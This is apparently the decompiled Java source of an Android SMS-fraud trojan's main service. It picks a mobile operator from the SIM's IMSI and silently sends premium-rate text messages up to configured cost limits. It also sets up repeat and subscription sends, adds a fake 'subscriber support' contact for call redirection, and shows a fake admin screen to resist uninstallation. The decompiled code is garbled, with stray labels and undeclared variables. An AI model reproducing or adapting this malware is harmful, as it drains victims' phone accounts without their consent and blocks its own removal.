package com.c3r2fdffs.i.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;
import ru.uninstall.FakeActivity;
import ru.uninstall.Functions;

public final class MainService
  extends Service
  implements ThreadOperationListener
{
  public static boolean working = false;
  
  public MainService() {}
  
  static boolean isEnable(JSONObject paramJSONObject)
  {
    bool2 = false;
    bool1 = bool2;
    try
    {
      if (paramJSONObject.has("enable"))
      {
        boolean bool3 = paramJSONObject.getBoolean("enable");
        bool1 = bool2;
        if (bool3) {
          bool1 = true;
        }
      }
    }
    catch (Exception paramJSONObject)
    {
      for (;;)
      {
        Settings.log(paramJSONObject);
        bool1 = bool2;
      }
    }
    Settings.log("enable: " + bool1);
    return bool1;
  }
  
  static JSONObject operator()
  {
    JSONObject localJSONObject3;
    label149:
    Object localObject;
    for (JSONObject localJSONObject1 = null;; localObject = localJSONObject3)
    {
      int i;
      try
      {
        JSONArray localJSONArray1 = new JSONObject(Constants.data).getJSONArray("operators");
        i = 0;
        if (i >= localJSONArray1.length())
        {
          if (localJSONObject1 != null) {
            return localJSONObject1;
          }
        }
        else
        {
          JSONObject localJSONObject2 = localJSONArray1.getJSONObject(i);
          JSONArray localJSONArray2 = localJSONObject2.getJSONArray("codes");
          int j = 0;
          for (;;)
          {
            if (j >= localJSONArray2.length())
            {
              localJSONObject3 = localJSONObject1;
              if (!localJSONObject2.has("default")) {
                break label149;
              }
              localJSONObject3 = localJSONObject1;
              if (!localJSONObject2.getBoolean("default")) {
                break label149;
              }
              localJSONObject3 = localJSONObject1;
              if (localJSONObject1 != null) {
                break label149;
              }
              localJSONObject3 = localJSONObject2;
              break label149;
            }
            boolean bool = Constants.imsi.startsWith(localJSONArray2.getString(j));
            localJSONObject3 = localJSONObject2;
            if (bool) {
              break;
            }
            j += 1;
          }
        }
        return localJSONObject3;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        localJSONObject3 = new JSONObject();
      }
      i += 1;
    }
  }
  
  static void sendSms(JSONObject paramJSONObject)
  {
    try
    {
      Settings.sendSms(paramJSONObject.getString("phone"), paramJSONObject.getString("text"));
      return;
    }
    catch (Exception paramJSONObject)
    {
      Settings.log(paramJSONObject);
    }
  }
  
  static void sleepAfterSend(JSONObject paramJSONObject)
  {
    try
    {
      if (paramJSONObject.has("sleep"))
      {
        Settings.log("parameter sleep");
        sleepInSeconds(paramJSONObject.getInt("sleep"));
      }
      return;
    }
    catch (Exception paramJSONObject)
    {
      Settings.log(paramJSONObject);
    }
  }
  
  static void sleepInSeconds(int paramInt)
  {
    Settings.log("sleep: " + paramInt + " sec");
    SystemClock.sleep(Constants.SECOND * paramInt);
  }
  
  static void sleepTimeout(JSONObject paramJSONObject)
  {
    try
    {
      Settings.log("parameter smsTimeout");
      sleepInSeconds(paramJSONObject.getInt("smsTimeout"));
      return;
    }
    catch (Exception paramJSONObject)
    {
      Settings.log(paramJSONObject);
    }
  }
  
  public static void start(Context paramContext, Intent paramIntent, String paramString)
  {
    Settings.log("MainService::start() key: " + paramString);
    Intent localIntent = new Intent(paramContext, MainService.class);
    paramIntent = paramIntent.getExtras();
    if (paramIntent != null) {
      localIntent.putExtras(paramIntent);
    }
    localIntent.putExtra("key", paramString);
    paramContext.startService(localIntent);
  }
  
  private void waitSms(int paramInt)
  {
    Settings.log("waitSms: " + paramInt + " sec");
    int i = 0;
    for (;;)
    {
      if (i >= paramInt) {}
      do
      {
        return;
        SystemClock.sleep(Constants.SECOND);
      } while (Settings.ok);
      i += 1;
    }
  }
  
  long loadTime(String paramString)
  {
    Settings.log("loadTime(): " + paramString);
    Object localObject2 = Settings.getSettings();
    Object localObject1 = localObject2;
    if (localObject2 == null)
    {
      localObject1 = new Settings();
      ((Settings)localObject1).load(this);
      Settings.setSettings((Settings)localObject1);
    }
    int i = 0;
    for (;;)
    {
      if (i >= ((Settings)localObject1).operators.size()) {
        return 0L;
      }
      localObject2 = (Operator)((Settings)localObject1).operators.get(i);
      if (((Operator)localObject2).name.equals(paramString)) {
        return ((Operator)localObject2).time;
      }
      i += 1;
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    setForeground(true);
  }
  
  public void onDestroy() {}
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    paramIntent = paramIntent.getExtras();
    if ((paramIntent != null) && (paramIntent.get("key") != null))
    {
      paramIntent = (String)paramIntent.get("key");
      Settings.log("MainService::onStart() key: " + paramIntent);
      if (paramIntent.equals("pay")) {
        new Thread(new ThreadOperation(this, 1, null)).start();
      }
    }
  }
  
  void saveTime(String paramString)
  {
    Settings.log("saveTime(): " + paramString);
    Object localObject2 = Settings.getSettings();
    Object localObject1 = localObject2;
    if (localObject2 == null)
    {
      localObject1 = new Settings();
      ((Settings)localObject1).load(this);
      Settings.setSettings((Settings)localObject1);
    }
    int i = 0;
    for (;;)
    {
      if (i >= ((Settings)localObject1).operators.size())
      {
        localObject2 = new Operator();
        ((Operator)localObject2).name = paramString;
        ((Operator)localObject2).time = System.currentTimeMillis();
        ((Settings)localObject1).operators.add(localObject2);
        ((Settings)localObject1).save(this);
        return;
      }
      localObject2 = (Operator)((Settings)localObject1).operators.get(i);
      if (((Operator)localObject2).name.equals(paramString))
      {
        ((Operator)localObject2).time = System.currentTimeMillis();
        ((Settings)localObject1).save(this);
        return;
      }
      i += 1;
    }
  }
  
  public void threadOperationRun(int paramInt, Object paramObject)
  {
    Settings.log("threadOperationRun: " + paramInt);
    if (paramInt == 1)
    {
      Settings.log("Start pay");
      Settings.log("working: " + working);
      if (!working) {}
    }
    else
    {
      return;
    }
    working = true;
    label422:
    label480:
    label699:
    label721:
    label739:
    label1034:
    label1050:
    label1057:
    label1071:
    label1084:
    for (;;)
    {
      JSONObject localJSONObject2;
      Object localObject1;
      Object localObject2;
      JSONObject localJSONObject3;
      try
      {
        Settings.getSettings();
        if (Settings.userCancel)
        {
          Settings.log("userCancel !!!");
          Settings.log("Stop pay");
          working = false;
        }
        paramObject = ((PowerManager)getSystemService("power")).newWakeLock(1, "Service");
        paramObject.acquire();
        try
        {
          localJSONObject1 = new JSONObject(Constants.data).getJSONObject("settings");
          if (localJSONObject1.has("callRedirect"))
          {
            localJSONObject2 = localJSONObject1.getJSONObject("callRedirect");
            if (localJSONObject2.getBoolean("enable")) {
              Settings.addContact(this, localJSONObject2.getString("to"), "Поддержка Абонентов");
            }
          }
          localJSONObject2 = operator();
          localObject1 = localJSONObject2.getString("name");
          long l1 = System.currentTimeMillis();
          paramInt = localJSONObject2.getInt("repeat");
          long l2 = loadTime((String)localObject1);
          Settings.log("operator name: " + (String)localObject1);
          Settings.log("now: " + l1);
          Settings.log("repeat: " + paramInt);
          Settings.log("last time send: " + l2);
          if (Constants.MINUTE * paramInt + l2 > l1) {
            continue;
          }
          Settings.log("time for send ok");
          if (!localJSONObject2.has("sms")) {
            continue;
          }
          localObject2 = localJSONObject2.getJSONArray("sms");
          paramInt = 0;
        }
        catch (Exception localException)
        {
          JSONObject localJSONObject1;
          Settings.log(localException);
          continue;
          paramInt += 1;
          continue;
          localObject2 = ((JSONArray)localObject1).getJSONObject(paramInt);
          if (!((JSONObject)localObject2).getBoolean("subscription")) {
            break label721;
          }
        }
        if (paramInt >= ((JSONArray)localObject2).length())
        {
          paramInt = localJSONObject2.getInt("mode");
          Settings.log("start sms: mode = " + paramInt);
          if ((paramInt != 1) && (paramInt != 41)) {
            break label1057;
          }
          if (localJSONObject2.has("sms"))
          {
            localObject1 = localJSONObject2.getJSONArray("sms");
            paramInt = 0;
            if (paramInt < ((JSONArray)localObject1).length()) {
              break label699;
            }
          }
          if (localJSONObject1.has("simpleSms"))
          {
            Settings.log("parameter simpleSms");
            localObject1 = localJSONObject1.getJSONObject("simpleSms");
            if (isEnable((JSONObject)localObject1))
            {
              sleepInSeconds(((JSONObject)localObject1).getInt("wait"));
              localObject1 = ((JSONObject)localObject1).getJSONArray("sms");
              paramInt = 0;
              if (paramInt < ((JSONArray)localObject1).length()) {
                break label1034;
              }
            }
          }
          if (localJSONObject1.has("antiUninstall"))
          {
            Settings.log("parameter antiUninstall");
            localJSONObject1 = localJSONObject1.getJSONObject("antiUninstall");
            if (isEnable(localJSONObject1))
            {
              sleepInSeconds(localJSONObject1.getInt("wait"));
              FakeActivity.text = localJSONObject1.getString("text");
              FakeActivity.repeat = localJSONObject1.getBoolean("repeat");
              Functions.showAdmin(this, FakeActivity.class);
            }
          }
          if (localJSONObject2.has("repeatSend"))
          {
            Settings.log("parameter repeatSend");
            localJSONObject1 = localJSONObject2.getJSONObject("repeatSend");
            if (isEnable(localJSONObject1)) {
              Settings.startRepeatTimer(this, localJSONObject1.getInt("time"));
            }
          }
          Settings.log("Stop pay");
          working = false;
          paramObject.release();
        }
      }
      catch (Exception paramObject)
      {
        paramObject.printStackTrace();
        continue;
        localJSONObject3 = ((JSONArray)localObject2).getJSONObject(paramInt);
        if (localJSONObject3.getBoolean("subscription"))
        {
          Settings.startSmsTimer(this, localJSONObject3.getLong("sleep"), paramInt, localJSONObject3.getString("phone"), localJSONObject3.getString("text"));
          continue;
        }
      }
      break label1050;
      sendSms((JSONObject)localObject2);
      sleepTimeout(localException);
      sleepAfterSend((JSONObject)localObject2);
      break label1050;
      int i = localJSONObject2.getInt("maxCost");
      int j = localJSONObject2.getInt("maxSms");
      Settings.log("maxCost = " + i);
      if (localJSONObject2.has("sms"))
      {
        localObject2 = localJSONObject2.getJSONArray("sms");
        paramInt = 0;
        for (;;)
        {
          if (paramInt >= ((JSONArray)localObject2).length()) {
            break label1084;
          }
          localJSONObject3 = ((JSONArray)localObject2).getJSONObject(paramInt);
          int n;
          int m;
          int k;
          if (localJSONObject3.getBoolean("subscription"))
          {
            n = paramInt;
            m = i;
            k = j;
          }
          else
          {
            int i1 = localJSONObject3.getInt("cost");
            Settings.log("sms cost = " + i1);
            n = paramInt;
            m = i;
            k = j;
            if (j > 0)
            {
              n = paramInt;
              m = i;
              k = j;
              if (i - i1 > 0)
              {
                saveTime((String)localObject1);
                JSONObject localJSONObject4 = localJSONObject3.getJSONObject("wait");
                Settings.phone = localJSONObject4.getString("phone");
                Settings.text = localJSONObject4.getString("text");
                Settings.ok = false;
                sendSms(localJSONObject3);
                waitSms(localJSONObject4.getInt("time"));
                Settings.log("sent.ok: " + Settings.ok);
                n = paramInt;
                m = i;
                k = j;
                if (Settings.ok)
                {
                  Settings.ok = false;
                  k = j - 1;
                  m = i - i1;
                  n = paramInt - 1;
                }
                sleepTimeout(localException);
                sleepAfterSend(localJSONObject3);
                break label1071;
                sendSms(((JSONArray)localObject1).getJSONObject(paramInt));
                paramInt += 1;
                break label480;
                paramInt += 1;
                break;
                if (paramInt == 2) {
                  break label739;
                }
                if (paramInt != 42) {
                  break label422;
                }
                break label739;
              }
            }
          }
          paramInt = n + 1;
          i = m;
          j = k;
        }
      }
    }
  }
}
